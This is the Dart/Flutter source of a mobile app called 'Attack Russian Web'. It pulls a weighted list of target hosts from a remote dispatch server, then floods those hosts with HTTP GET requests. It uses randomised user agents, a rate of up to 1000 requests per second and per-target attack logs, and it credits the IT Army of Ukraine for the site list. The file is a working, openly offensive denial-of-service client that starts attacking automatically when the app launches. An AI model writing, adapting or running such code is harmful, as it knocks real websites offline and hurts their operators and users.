import 'dart:convert';
import 'package:intl/intl.dart';
import 'package:flutter/material.dart';
import 'package:flutter/widgets.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart' show rootBundle;
import 'package:url_launcher/url_launcher.dart';
import 'package:dart_random_choice/dart_random_choice.dart';
import 'package:localstorage/localstorage.dart';

const textColor = Color(0xFFEAEAEA);
const grayColor = Color(0xFFC6C6C6);
const linkColor = Color(0xFF9AC9FF);

const URL_SERVER = 'https://arwdispatch.redblackfury.com';

Map logs = {};

Map translate = {
  "en": {
    "__headline": "Bombing Russian Web infrastructure...",
    "__you_ip": "Your ip",
    "__helper_text_3": "* set lower value if your smartphone lags",
    "__current_requests": "Current requests per second",
    "__see": "* see",
    "__which_sites": "which sites I bombed",
    "__total_requests": "Total requests",
    "__pause": "PAUSE",
    "__start": "START",
    "__it_army": "Site list provided by",
    "__source_code": "Source code",
    "__target_host": "Host",
    "__protocol": "Protocol",
    "__first_attack": "First attack",
    "__last_attack": "Last attack",
    "__requests_count": "Requests count",
    "__helper_text_1": "* non-UA IP allows to bomb more sites",
    "__request_limit": "Bomb requests per second limit"
  },
  "uk": {
    "__headline": "Бомбардуємо Веб інфраструктуру росіян...",
    "__you_ip": "Ваша IP",
    "__helper_text_3": "* зменшіть, якщо ваш смартфон глючить",
    "__current_requests": "Активних запитів за секунду",
    "__see": "* показати",
    "__which_sites": "які сайти я атакую",
    "__total_requests": "Всього запитів",
    "__pause": "ПАУЗА",
    "__start": "СТАРТ",
    "__it_army": "Список сайтів від",
    "__source_code": "Вихідний код",
    "__target_host": "Ціль",
    "__protocol": "Протокол",
    "__first_attack": "Перша атака",
    "__last_attack": "Остання атака",
    "__requests_count": "Кількість атак",
    "__helper_text_1":
        "* неукраїнські IP адреси дозволяють бомбити більше сайтів",
    "__request_limit": "Ліміт запитів-бомб за секунду"
  }
};
String globalLocale = "en";
void main() {
  runApp(MyApp());
}

Future<String> timeout(int d) {
  return Future.delayed(Duration(seconds: d), () => 'Large Latte');
}

Future<String> timeoutMilliseconds(int d) {
  return Future.delayed(Duration(milliseconds: d), () => 'Large Latte');
}

class MyApp extends StatefulWidget {
  // This widget is the root of your application.
  @override
  MyAppState createState() => MyAppState();
}

class MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Attack Russian Web',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'ARW'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

const SHOOT_INTERVAL_SECOND = 5;
const MAX_LIMIT = 1000;
const STEP_CHANGE_LIMIT = 10;
const NAME_STATUS_WORKER = 'statusWorker';
const LOCAL_STORAGE_ITEM_TOTAL_REQS = 'totalReqs';
const LOCAL_STORAGE_ITEM_UP_MS = 'upMs';
const LOCAL_STORAGE_ITEM_LIMIT_REQ = 'limitReqs';

final LocalStorage STORAGE = new LocalStorage('arwStorage');
const UPDATE_VIEW_TIMEOUT_SECONDS = 1;

const WINDOW_SIZE_MS = 20000;
const WINDOW_TAIL_TO_HEAD_RATIO = 5; // 0.3 - tail - 0.7 head

const REFRESH_RPS_RATE_MS = 1000;

class _MyHomePageState extends State<MyHomePage> {
  int _limitRequests = 10;
  int _currentRPS = 0;
  int _totalRequests = 0;
  int _upMilliseconds = 0;
  bool _statusWorker = false;
  List _tasks = [];
  List<double> _weight = [];
  String _totalStringRequests = '0';
  DateTime windowStartState = DateTime.now();
  int requestsAtWindowState = 0;
  String locale = "en";

  var _upTime = '0s';
  var _userAgent = '';
  var _myIp = '0.0.0.0';
  var _country = 'UA';

  @override
  void initState() {
    super.initState();
    asyncInit();
    moveFloatingRPSWindows();
    runRPSRefresher();
  }

  void asyncInit() async {
    await _initData(true);
    _intervalWorker();
    _intervalInitData();
    startWorker(false);
  }

  void moveFloatingRPSWindows() async {
    DateTime windowStart = DateTime.now();
    int requestsAtWindowStart = _totalRequests;
    while (true) {
      setState(() {
        windowStartState = windowStart;
        requestsAtWindowState = requestsAtWindowStart;
      });
      await timeoutMilliseconds(
          (WINDOW_SIZE_MS * WINDOW_TAIL_TO_HEAD_RATIO).toInt());
      windowStart = DateTime.now();
      requestsAtWindowStart = _totalRequests;
      await timeoutMilliseconds(
          (WINDOW_SIZE_MS * (1 - WINDOW_TAIL_TO_HEAD_RATIO)).toInt());
    }
  }

  void runRPSRefresher() async {
    while (true) {
      await timeoutMilliseconds(REFRESH_RPS_RATE_MS.toInt());
      int data = ((_totalRequests - requestsAtWindowState) /
              (DateTime.now().millisecondsSinceEpoch -
                  windowStartState.millisecondsSinceEpoch) *
              1000)
          .toInt();
      setState(() {
        _currentRPS = data;
      });
    }
  }

  void shootFetches() async {
    for (var i = 0; i < _limitRequests * SHOOT_INTERVAL_SECOND; i++) {
      final pointAttack = randomChoice(_tasks, _weight);
      Uri endpoint = Uri.parse("${pointAttack.proto}://${pointAttack.host}");

      http
          .get(endpoint, headers: {"User-Agent": _userAgent})
          .timeout(const Duration(seconds: 3))
          .catchError((e) {});
      _totalRequests += 1;
      logs[pointAttack.sId]["count"] += 1;
      logs[pointAttack.sId]["lastAttack"] = DateTime.now();
    }
  }

  void worker() async {
    if (_tasks.isEmpty) {
      changeStatusWorker(false);
      return;
    }

    while (true) {
      shootFetches();
      if (_statusWorker == false) {
        break;
      }
      await timeout(SHOOT_INTERVAL_SECOND);
    }
  }

  void startWorker(bool manual) async {
    await STORAGE.ready;
    var stateWorkerStorage = await STORAGE.getItem(NAME_STATUS_WORKER);
    int? historicalRqs = await STORAGE.getItem(LOCAL_STORAGE_ITEM_TOTAL_REQS);
    int? historicalMs = await STORAGE.getItem(LOCAL_STORAGE_ITEM_UP_MS);
    int? historicalLimit = await STORAGE.getItem(LOCAL_STORAGE_ITEM_LIMIT_REQ);

    setState(() {
      _totalRequests = historicalRqs ?? 0;
      _upMilliseconds = historicalMs ?? 0;
      _limitRequests = historicalLimit ?? 10;
    });

    if (stateWorkerStorage == 'disable' && manual == false) {
      return;
    }

    if (_statusWorker == false) {
      await changeStatusWorker(true);
      worker();
    }
  }

  Future<void> changeStatusWorker(bool status) async {
    await STORAGE.ready;
    await STORAGE.setItem(
        NAME_STATUS_WORKER, status == true ? 'enable' : 'disable');
    setState(() {
      _statusWorker = status;
    });
  }

  void _intervalInitData() async {
    while (true) {
      await timeout(10 * 60); // 10 min
      await _initData(false);
    }
  }

  Future<void> _initData(bool first) async {
    var url = URL_SERVER + '/get_targets?device=android';

    if (first == false) {
      url = url + '&lastRPS=' + _currentRPS.toString();
    }

    final response = await http.get(Uri.parse(url)).catchError((e) {});
    if (response == null) {
      print("Error load data from server");
      return;
    }
    var data = jsonDecode(response.body);
    Map tempLogs = logs;
    // set user agent
    var randomUserAgent = data['userAgents'] != null
        ? (data['userAgents'].toList()..shuffle()).first['string']
        : 'ARW';

    var country = data['countryISO'];
    List<double> weight = [];

    // set tasks
    var targetObjsJson = data['result'] as List;

    List<Target> targetObjs =
        targetObjsJson.map((item) => Target.fromJson(item)).toList();
    targetObjs = targetObjs.where((x) {
      if (x.enabled == false) {
        return false;
      }
      if (country == 'UA' && x.uaAllowed == false) {
        return false;
      }
      return true;
    }).toList();

    targetObjs.forEach((x) {
      weight.add(x.weight!.toDouble());
      if (tempLogs.containsKey(x.sId) != true) {
        tempLogs[x.sId] = {
          "host": x.host,
          "tag": x.tags,
          "proto": x.proto,
          "startAttack": DateTime.now(),
          "lastAttack": '',
          "count": 0
        };
      }
    });

    var ip = data['ip'];
    var _maskedIp = "***" +
        ip.split("").asMap().entries.map((e) {
          return e.key < ip.length / 2 ? '' : e.value;
        }).join("");

    setState(() {
      _myIp = _maskedIp;
      _country = country;
      _userAgent = randomUserAgent;
      _tasks = targetObjs;
      _weight = weight;
      logs = tempLogs;
    });
  }

  void changeLimitRequest(int value) {
    var tempValue = _limitRequests +
        value * STEP_CHANGE_LIMIT * (_limitRequests <= 100 ? 1 : 10);

    if (tempValue <= MAX_LIMIT && tempValue > 0) {
      setState(() {
        _limitRequests = tempValue;
      });
    }
  }

  Future<void> _launchInBrowser(String url) async {
    if (!await launch(
      url,
      forceSafariVC: false,
      forceWebView: false,
    )) {
      throw 'Could not launch $url';
    }
  }

  String timeAfterLaunch() {
    int seconds = _upMilliseconds ~/ 1000;

    if (seconds > 86400) {
      return '${seconds ~/ 86400}d';
    } else if (seconds > 3600) {
      return '${seconds ~/ 3600}h';
    } else if (seconds > 60) {
      return '${seconds ~/ 60}m';
    }
    return '${seconds ~/ 1}s';
  }

  Future<void> _intervalWorker() async {
    while (true) {
      DateTime prevCycle = DateTime.now();
      await timeout(UPDATE_VIEW_TIMEOUT_SECONDS);

      await STORAGE.ready;
      await STORAGE.setItem(LOCAL_STORAGE_ITEM_TOTAL_REQS, _totalRequests);
      await STORAGE.setItem(LOCAL_STORAGE_ITEM_UP_MS, _upMilliseconds);
      await STORAGE.setItem(LOCAL_STORAGE_ITEM_LIMIT_REQ, _limitRequests);

      setState(() {
        _upTime = timeAfterLaunch();
        _totalStringRequests = Formatter.formatter(_totalRequests);
      });
      DateTime now = DateTime.now();
      Duration diffTime = now.difference(prevCycle);
      _upMilliseconds += diffTime.inMilliseconds;
    }
  }

  void changeLocale(String lang) {
    globalLocale = lang;
    setState(() {
      locale = lang;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Container(
          width: double.infinity,
          decoration: BoxDecoration(
            gradient: gradient(),
          ),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Row(
                mainAxisAlignment: MainAxisAlignment.end,
                children: [
                  TextButton(
                      style: ButtonStyle(
                        backgroundColor: locale == 'en'
                            ? MaterialStateProperty.all<Color>(
                                Color.fromARGB(170, 255, 255, 255))
                            : null,
                      ),
                      onPressed: () {
                        changeLocale("en");
                      },
                      child: Row(children: [
                        const Image(
                            image: AssetImage('assets/usuk.png'),
                            width: 30,
                            height: 20),
                        const SizedBox(
                          width: 5,
                        ),
                        Text(
                          'Eng lang',
                          style: TextStyle(
                              fontSize: 14,
                              color: locale == 'en'
                                  ? const Color(0xFF494949)
                                  : const Color(0xff9AC9FF)),
                        ),
                      ])),
                  TextButton(
                      style: ButtonStyle(
                        backgroundColor: locale == 'uk'
                            ? MaterialStateProperty.all<Color>(
                                Color.fromARGB(170, 255, 255, 255))
                            : null,
                      ),
                      onPressed: () {
                        changeLocale("uk");
                      },
                      child: Row(children: [
                        const Image(
                            image: AssetImage('assets/uk.png'),
                            width: 30,
                            height: 20),
                        const SizedBox(
                          width: 5,
                        ),
                        Text(
                          'Укр мова',
                          style: TextStyle(
                              fontSize: 14,
                              color: locale == 'uk'
                                  ? const Color(0xFF494949)
                                  : const Color(0xff9AC9FF)),
                        ),
                      ])),
                  const SizedBox(width: 20),
                ],
              ),
              const SizedBox(
                height: 30,
              ),
              Text(
                translate[locale]["__headline"],
                style: TextStyle(fontSize: 16, color: textColor),
              ),
              const SizedBox(height: 20),
              Text(
                translate[locale]["__you_ip"],
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 5),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: <Widget>[
                  Image(
                      image: AssetImage('assets/country/$_country.png'),
                      width: 30,
                      height: 20),
                  const SizedBox(width: 7),
                  Text(
                    _myIp,
                    style: const TextStyle(fontSize: 14, color: textColor),
                  ),
                ],
              ),
              const SizedBox(height: 5),
              Text(
                translate[locale]["__helper_text_1"],
                style: TextStyle(fontSize: 12, color: grayColor),
              ),
              const SizedBox(height: 20),
              Text(
                translate[locale]["__request_limit"],
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: <Widget>[
                  IconButton(
                    icon: Image.asset('assets/minus.png'),
                    iconSize: 5,
                    onPressed: () {
                      changeLimitRequest(-1);
                    },
                  ),
                  const SizedBox(width: 5),
                  Text(
                    '$_limitRequests',
                    style: const TextStyle(fontSize: 14, color: textColor),
                  ),
                  const SizedBox(width: 5),
                  IconButton(
                    icon: Image.asset('assets/plus.png'),
                    iconSize: 5,
                    onPressed: () {
                      changeLimitRequest(1);
                    },
                  ),
                ],
              ),
              Text(
                translate[locale]["__helper_text_3"],
                style: TextStyle(fontSize: 12, color: grayColor),
              ),
              const SizedBox(height: 20),
              Text(
                translate[locale]["__current_requests"],
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 10),
              Text(
                '$_currentRPS',
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 10),
              TextButton(
                style: TextButton.styleFrom(
                  padding: EdgeInsets.zero,
                  tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                  minimumSize: Size.zero,
                  alignment: Alignment.topLeft,
                ),
                onPressed: () {
                  Navigator.push(
                    context,
                    MaterialPageRoute(builder: (context) => const LogRoute()),
                  );
                },
                child: Text(
                  translate[locale]["__which_sites"],
                  style: const TextStyle(
                    fontSize: 12,
                    color: Color(0xFF9AC9FF),
                    decoration: TextDecoration.underline,
                  ),
                ),
              ),
              const SizedBox(height: 20),
              Text(
                translate[locale]["__total_requests"],
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 10),
              Text(
                '$_totalStringRequests',
                style: TextStyle(fontSize: 14, color: textColor),
              ),
              const SizedBox(height: 10),
              Text(
                'Up time: $_upTime',
                style: const TextStyle(fontSize: 12, color: grayColor),
              ),
              const SizedBox(height: 20),
              TextButton(
                  style: ButtonStyle(
                      backgroundColor: MaterialStateProperty.all<Color>(
                          const Color(0xFF1F1A1A)),
                      shape: MaterialStateProperty.all<RoundedRectangleBorder>(
                          RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(5.0),
                              side: const BorderSide(
                                  color: Color(0xFF9AC9FF), width: 2.0)))),
                  onPressed: () {
                    _statusWorker == true
                        ? changeStatusWorker(false)
                        : startWorker(true);
                  },
                  child: Column(
                    children: [
                      Padding(
                        padding: const EdgeInsets.symmetric(
                            vertical: 8.0, horizontal: 80.0),
                        child: Text(
                          _statusWorker == true
                              ? translate[locale]["__pause"]
                              : translate[locale]["__start"],
                          style: const TextStyle(fontSize: 12),
                        ),
                      ),
                    ],
                  )),
              const SizedBox(height: 40),
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: <Widget>[
                  const Image(
                      image: AssetImage('assets/it_army.png'),
                      width: 32,
                      height: 32),
                  const SizedBox(width: 5),
                  Column(
                    children: <Widget>[
                      Text(
                        translate[locale]["__it_army"],
                        textAlign: TextAlign.left,
                        style: TextStyle(fontSize: 14, color: textColor),
                      ),
                      TextButton(
                        style: TextButton.styleFrom(
                          padding: EdgeInsets.zero,
                          tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                          minimumSize: Size.zero,
                          alignment: Alignment.topLeft,
                        ),
                        onPressed: () {
                          _launchInBrowser('https://t.me/itarmyofukraine2022');
                        },
                        child: const Text(
                          'IT ARMY of Ukraine',
                          style: TextStyle(fontSize: 12),
                        ),
                      )
                    ],
                  ),
                  const SizedBox(width: 20),
                  const Image(
                      image: AssetImage('assets/git.png'),
                      width: 32,
                      height: 32),
                  const SizedBox(width: 5),
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: <Widget>[
                      Text(
                        translate[locale]["__source_code"],
                        style: TextStyle(fontSize: 14, color: textColor),
                      ),
                      TextButton(
                        style: TextButton.styleFrom(
                          padding: EdgeInsets.zero,
                          tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                          minimumSize: Size.zero,
                          alignment: Alignment.topLeft,
                        ),
                        onPressed: () {
                          _launchInBrowser('https://github.com/redblackfury');
                        },
                        child: const Text(
                          'GitHub',
                          style: TextStyle(fontSize: 12),
                        ),
                      )
                    ],
                  )
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  LinearGradient gradient() {
    return const LinearGradient(
        colors: [
          Color(0xFFC00000),
          Color(0xFF000000),
        ],
        begin: FractionalOffset(0.0, 0.0),
        end: FractionalOffset(0.0, 1.0),
        stops: [0.0, 1.0],
        tileMode: TileMode.clamp);
  }
}

class Target {
  String? sId;
  String? url;
  String? host;
  String? proto;
  bool? uaAllowed;
  bool? enabled;
  String? tags;
  double? weight;

  Target(
      {this.sId,
      this.url,
      this.host,
      this.proto,
      this.uaAllowed,
      this.enabled,
      this.tags,
      this.weight});

  Target.fromJson(Map<String, dynamic> json) {
    sId = json['_id'];
    url = json['url'];
    host = json['host'];
    proto = json['proto'];
    uaAllowed = json['uaAllowed'];
    enabled = json['enabled'];
    tags = json['tags'];
    weight = json['weight'];
  }
}

class Formatter {
  static String formatter(int currentBalance) {
    try {
      if (currentBalance > 999 && currentBalance < 99999) {
        return "${(currentBalance / 1000).toStringAsFixed(1)}k";
      } else if (currentBalance > 99999 && currentBalance < 999999) {
        return "${(currentBalance / 1000).toStringAsFixed(0)}K";
      } else if (currentBalance > 999999 && currentBalance < 999999999) {
        return "${(currentBalance / 1000000).toStringAsFixed(1)}M";
      } else if (currentBalance > 999999999) {
        return "${(currentBalance / 1000000000).toStringAsFixed(1)}B";
      } else {
        return currentBalance.toString();
      }
    } catch (e) {
      print(e);
    }
    return '';
  }

  static String formatterDate(dynamic date) {
    try {
      final DateFormat formatter = DateFormat('H:m:s');
      final String formatted = formatter.format(date);
      return formatted;
    } catch (e) {
      return '';
    }
  }
}

const WIDTH_NAME = 100.0;

class LogRoute extends StatelessWidget {
  const LogRoute({Key? key}) : super(key: key);
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Container(
            width: double.infinity,
            color: const Color(0xFF292929),
            padding: EdgeInsets.all(30),
            child: SingleChildScrollView(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.start,
                mainAxisSize: MainAxisSize.max,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: <Widget>[
                  for (var key in logs.keys)
                    Column(
                      children: [
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  translate[globalLocale]["__target_host"],
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  logs[key]["host"],
                                  style: const TextStyle(
                                      color: Color(0xFF9AC9FF), fontSize: 12),
                                ),
                                true == true
                                    ? Text(
                                        logs[key]["tag"],
                                        textAlign: TextAlign.left,
                                        style: const TextStyle(
                                            color: Color(0xFFEAEAEA),
                                            fontSize: 12),
                                      )
                                    : const Text(''),
                              ],
                            )
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  translate[globalLocale]["__protocol"],
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              "${logs[key]["proto"] == 'http' ? '80' : '443'}/${logs[key]["proto"]}",
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  translate[globalLocale]["__first_attack"],
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              Formatter.formatterDate(logs[key]["startAttack"]),
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  translate[globalLocale]["__last_attack"],
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              Formatter.formatterDate(logs[key]["lastAttack"]),
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const SizedBox(height: 10),
                        Row(
                          children: [
                            Container(
                                width: WIDTH_NAME,
                                child: Text(
                                  translate[globalLocale]["__requests_count"],
                                  style: TextStyle(
                                      color: Color(0xFF9B9B9B), fontSize: 12),
                                )),
                            Text(
                              logs[key]["count"].toString(),
                              style: const TextStyle(
                                  color: Color(0xFFEAEAEA), fontSize: 12),
                            ),
                          ],
                        ),
                        const Divider(color: Color(0xFFEAEAEA))
                      ],
                    )
                ],
              ),
            )),
      ),
      floatingActionButton: FloatingActionButton(
        elevation: 100,
        autofocus: true,
        onPressed: () {
          Navigator.pop(context);
        },
        backgroundColor: const Color(0xFF1F1A1A),
        foregroundColor: const Color(0xFF1F1A1A),
        shape: const RoundedRectangleBorder(
            side: const BorderSide(color: Color(0xFF9AC9FF), width: 2.0),
            borderRadius: BorderRadius.all(Radius.circular(50.0))),
        child: const Text(
          'X',
          style: TextStyle(color: Color(0xFF9AC9FF)),
        ),
      ),
      floatingActionButtonLocation: FloatingActionButtonLocation.endTop,
    );
  }
}
